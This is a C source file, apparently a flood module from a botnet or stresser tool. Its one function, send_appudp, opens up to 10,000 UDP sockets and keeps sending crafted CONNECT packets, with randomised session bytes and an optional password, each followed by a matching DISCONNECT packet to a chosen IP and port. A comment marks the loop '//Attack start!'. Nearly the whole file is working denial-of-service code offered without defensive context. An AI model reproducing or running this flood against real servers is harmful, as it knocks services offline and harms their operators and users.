#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>
#include <string.h>
#include <sys/time.h>

int fds[65535];

void make_random(unsigned char* buff)
{
    buff[5] = rand()%255;
    buff[6] = rand()%255;
    buff[7] = rand()%255;
    buff[8] = rand()%255;
    buff[9] = rand()%255;
}


int send_appudp(const char *destip, int destport, int seconds, int delay, int socket_num, char* passwd)
{
    int sock;
    struct sockaddr_in servaddr;
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(destport);
    servaddr.sin_addr.s_addr = inet_addr(destip);
    int udelay = delay * 1000;
    int stoptime = time(NULL) + seconds;
    int i = 0;
    unsigned char buff_a[200] = {0};
    unsigned char buff_b[1000] = {0};
    int buff_a_len = 0;
    int pass_len = 0;

    srand(time(NULL) ^ getpid());

    if(passwd != NULL) {
        pass_len = strlen(passwd);
    }

    int addr_len = sizeof(struct sockaddr_in);
    struct sockaddr_in addr;
    int sidx = 0;
    srand(time(NULL) ^ getpid());

    //This is CONNECT packet
    memcpy(buff_a, "\x08\x07\x00\x00\x00\x8e\x52\xd7\x6f\xdf\xd2\xd7\x08\x00\x00\x00\x00", 17);

    //This is DISCONNECT packet
    memcpy(buff_b, "\x0a\x8e\x52\xd7\x6f\xdf\xd2\xd7\x08", 9);

    //Fill password in Connect Packet
    if(pass_len > 0) {
        memcpy(buff_a+17, passwd, pass_len);
        buff_a[13] = pass_len;
    }
    buff_a_len = pass_len + 17;

    //Create sockets
    if(socket_num > 10000 || socket_num < 0) {
        socket_num = 1000;
        printf("change socket num to 1000\n");
    }

    for(i =0; i< socket_num; i++) {
        if ((fds[i] = socket(PF_INET, SOCK_DGRAM, 0)) < 0) {
            printf("create no.%d socket failed\n", i);
            return 0;
        }
    }

    //Attack start!
    
    while(time(NULL) < stoptime)
    {
        //change socket
        sidx = (sidx >= socket_num) ? 0 : sidx;
        sock = fds[sidx++];

        //fill random data in connect packet
        make_random(buff_a);

        //send CONNECT packet to server
        sendto(sock, buff_a, buff_a_len, 0, (struct sockaddr *)&servaddr, sizeof(servaddr));

        //fill random data in disconnect packet related to Connect packet
        memcpy(buff_b+1, buff_a+5,8);

        //send Disconnect packet
        sendto(sock, buff_b, 9, 0, (struct sockaddr *)&servaddr, sizeof(servaddr));

        if(udelay > 0){
            usleep(udelay);
        }
    }

    for(i =0; i< socket_num; i++) {
        close(fds[i]);
    }

    return 0;
}
